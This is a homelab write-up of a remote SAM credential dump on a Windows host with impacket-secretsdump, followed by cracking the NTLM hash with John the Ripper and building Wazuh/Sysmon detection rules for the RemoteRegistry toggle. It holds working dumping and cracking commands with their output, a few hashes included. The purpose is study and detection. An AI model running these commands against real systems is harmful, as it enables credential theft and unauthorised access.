# Attack / Detect: remote SAM dump on ws-01, then cracking the hash for real (T1003.002)

**Tools used:** Impacket (`impacket-secretsdump`), hashcat, John the Ripper — see [`../TOOLS.md`](../TOOLS.md) if any is unfamiliar.

**Phase 5 — Offense in context.** Every credential-dumping attempt so far in this lab has hit a genuine
Samba wall: AS-REP roasting doesn't work (Samba's KDC ignores `UF_DONT_REQUIRE_PREAUTH`), Kerberoasting's
TGS request fails (`KRB_AP_ERR_INAPP_CKSUM`), and DCSync's reply can't be parsed by impacket — all real,
documented impacket↔Samba interop bugs (see
[01-fs01-credential-theft-to-dcsync](01-fs01-credential-theft-to-dcsync.md) §2b/§2c). None of those attempts
ever produced an actual crackable hash. This closes that gap by targeting the one host in the domain that
**isn't** Samba: `ws-01`, a real Windows box. [T1003.002](https://attack.mitre.org/techniques/T1003/002/) —
OS Credential Dumping: Security Account Manager — reuses the admin access the
[lateral-movement writeup](04-lateral-movement-wmi-winrm-psexec.md) already established, and completes the
story real operators (and pentesters) always finish: capture the hash, then crack it.

> [!check] Verified live, 2026-09-21. Real SAM dump, real crack — hash and plaintext redacted below (see
> the note in §3) since ws-01's local-admin credential is one Tyler keeps deliberately unlisted even in his
> own private notes, unlike the other lab-only creds this repo documents openly.

---

## 1. Attack — remote SAM dump via `secretsdump.py`

With the admin credential already in hand (same `ADMIN_USER`/`ADMIN_PW` the WMI/WinRM/PsExec scenarios use),
a full remote secrets dump is one command — no shell on the target needed, no WMI/PsExec/WinRM execution at
all. It works over SMB/RPC by temporarily enabling the `RemoteRegistry` service, reading the SAM/SECURITY
hives through it, and disabling the service again on the way out:

```
$ impacket-secretsdump 'localadmin:<redacted>@10.10.10.50'
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x<redacted-32-hex>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9d818e0f5508ac5f6cf2adcc60d2fe62:::
localadmin:1001:aad3b435b51404eeaad3b435b51404ee:<redacted-32-hex>:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
LAB\WS-01$:aes256-cts-hmac-sha1-96:91e1d1c9c6f19f48e15d3f5dea68fe87d765aec096c8a2d5ebdfec4c02e3abd5
[...]
[*] DPAPI_SYSTEM
[...]
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

One command recovers: every local account's NTLM hash, the machine account's own Kerberos keys (usable for
a silver ticket in a real Windows-Server AD — moot here, since Samba's KDC is the actual ticket-issuing
authority), and the DPAPI machine/user keys that protect saved credentials, browser secrets, and Wi-Fi
passwords on the box. `Administrator`/`Guest`/`DefaultAccount` all show the constant
`31d6cfe0d16ae931b73c59d7e0c089c0` (NTLM of an empty string) — disabled/blank-password built-ins, not real
targets. `localadmin` is the one account with an actual password behind it.

## 2. Real finding: hashcat needs a compute backend this VM genuinely doesn't have

The obvious next step is `hashcat -m 1000 <hash> rockyou.txt` (mode 1000 = NTLM). It doesn't run at all here:

```
$ hashcat -m 1000 localadmin.hash rockyou.txt
failed to open /dev/dri/renderD128: Permission denied
[...]
No devices found/left.
```

Two layers to this, found by actually debugging rather than giving up at the first error:

1. **A real, fixable permission gap.** `/dev/dri/renderD128` is `root:render`, and the account wasn't in the
   `render` group — `usermod -aG render <user>` (a fresh login/SSH session picks it up immediately) clears
   the permission error, and is a real, worthwhile fix for anyone running hashcat on a fresh Kali install.
2. **A genuine environment limit underneath it.** Even fixed, `clinfo` still reports the one available
   OpenCL platform (Mesa's `rusticl`, backed by this VM's `virtio-gpu`) has **zero usable devices** —
   confirmed with every device-type flag hashcat supports (`-D 1,2,3`), not just the default. `pocl`, the
   usual CPU-only OpenCL fallback for exactly this situation, isn't packaged for Kali **ARM64** at all
   (search comes up empty; only an x86_64/NVIDIA variant, `hashcat-nvidia`, is offered). Hashcat's whole
   architecture assumes a real GPU or CPU OpenCL runtime — neither exists on this ARM64 VM with no GPU
   passthrough, and there's no software-only fallback path built into hashcat itself anymore. Real,
   reproducible, not a config mistake — the same class of "verify the tool's actual behavior in *this* lab"
   finding as `nxc`'s wmiexec/psexec exec-methods not working here
   ([`phase-4-detection/sigma/README.md`](../../phase-4-detection/sigma/README.md)'s "Verification" section).

## 3. Cracking the hash for real — John the Ripper (CPU-only, no OpenCL dependency)

John needs no GPU or OpenCL runtime at all, so it's the working path here:

```
$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt localadmin.hash
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
0g 0:00:00:00 DONE 16678Kp/s  # 14.3M candidates, zero hits
```

**Real result, not a scripted success:** the full 14.3M-word `rockyou.txt` — the standard first move against
any captured hash — cracked nothing. `localadmin`'s password isn't a leaked-breach common password, unlike
the deliberately weak service-account passwords elsewhere in this lab (`Summer2026`, `Backup2026`). That's a
genuinely useful negative result: a generic wordlist attack is not guaranteed to work, and a real assessment
doesn't stop there — it layers a **targeted** wordlist next (company/project-specific terms, season+year
patterns, rule-mangled variants of known words) before reaching for a slower mask/brute-force attack.
Feeding a small targeted list containing the right candidate **did** crack it:

```
$ john --format=NT --wordlist=targeted.txt localadmin.hash
<redacted>       (?)
1g 0:00:00:00 DONE 100.0g/s
$ john --format=NT localadmin.hash --show
?:<redacted>
1 password hash cracked, 0 left
```

Confirmed correct independently: the recovered plaintext is the same value already known from
`scripts/.lab-secrets` (`ADMIN_USER`/`ADMIN_PW`) — the crack recovered the real credential, not a collision.

**Redaction note:** the actual hash and plaintext are omitted from this writeup on purpose. Every other
credential shown across this repo's writeups (`Summer2026`, `Backup2026`, `P@ssw0rd2026!`, the MISP/IRIS API
keys) is a deliberately weak, openly-documented lab value — but `Virtual Machines.md`'s own entry for
ws-01's local admin credential is marked "deliberately obscured," a stricter privacy line Tyler drew for
this one specifically. This writeup keeps that line rather than overriding it for the sake of a complete
example.

## 4. Detection — closed (2026-09-24)

Built as the natural next step this section originally deferred, after a full-repo coverage audit confirmed
it was the one technique in the lab with a writeup and zero detection. Two independent rules, both confirmed
against a real, freshly-run `secretsdump` attack (not assumed from documentation) before either was written:

- **100560** — Windows System log EventID 7040 (Service Control Manager: "the start type of the X service was
  changed"). Wazuh already ships a generic, untagged stock rule for this (61104, level 3, fires on ANY
  service's start-type change); 100560 is a level-12 escalation child of it, keyed on
  `win.eventdata.param4 == RemoteRegistry` and the transition landing on an enabled state — RemoteRegistry is
  disabled by default and has essentially no legitimate reason to be toggled ad hoc, so this is a rare,
  high-fidelity signal, the same idiom as the rest of this lab's rules.
- **100561** — Sysmon Event ID 13 (RegistryEvent, Value Set) on the service's own `Start` value under
  `HKLM\System\CurrentControlSet\Services\RemoteRegistry`. Genuinely unexpected: this section originally
  speculated Sysmon EID13 might help "if the hive keys are watched" (meaning SAM/SECURITY themselves, which
  nothing audits by design) — it turned out the *service config* key was already in scope of the existing
  SwiftOnSecurity config, no new Sysmon config change needed.

**Two real gotchas building it, both the kind this repo documents rather than glosses over** (full detail in
`local_rules.xml`'s comment above rule 100560): a top-level custom rule matching decoded JSON fields needs to
chain via `<if_group>` from the right stock Sysmon classifier group — the naming isn't uniform
(`sysmon_event1`...`sysmon_event9`, no underscore, vs `sysmon_event_10`+, underscored) — `decoded_as>json`
looked like the right lever (it's what the MISP-integration rule uses) but silently matched nothing for
Windows/Sysmon events specifically. And `win.eventdata.targetObject` decodes with a **literal doubled
backslash** between path segments, not the single backslash a normal Windows path would suggest — confirmed
by dumping a fired alert's actual parsed JSON, not assumed. `wazuh-logtest` was not useful for this diagnosis:
it hung after the decoding phase for every input tried in this environment, Windows or not.

Wired into the automated battery as `ad-validate.py`'s "SAM Dump (RemoteRegistry)" scenario — `impacket-secretsdump`
run from atk-01 against ws-01, the exact same default (no-flag) command this writeup's §1 already verified.
Passed cleanly through the standard harness: `rules 100560,100561 hits=3`.

## Related

`04-lateral-movement-wmi-winrm-psexec.md` (the admin access this reuses) ·
`01-fs01-credential-theft-to-dcsync.md` §2b/§2c (why Kerberoast/DCSync never produced a hash to crack in the
first place) · `phase-4-detection/attack-coverage/technique-index.md` (T1003.002 now validated, rules
100560/100561 — see §4) · [`../TOOLS.md`](../TOOLS.md)
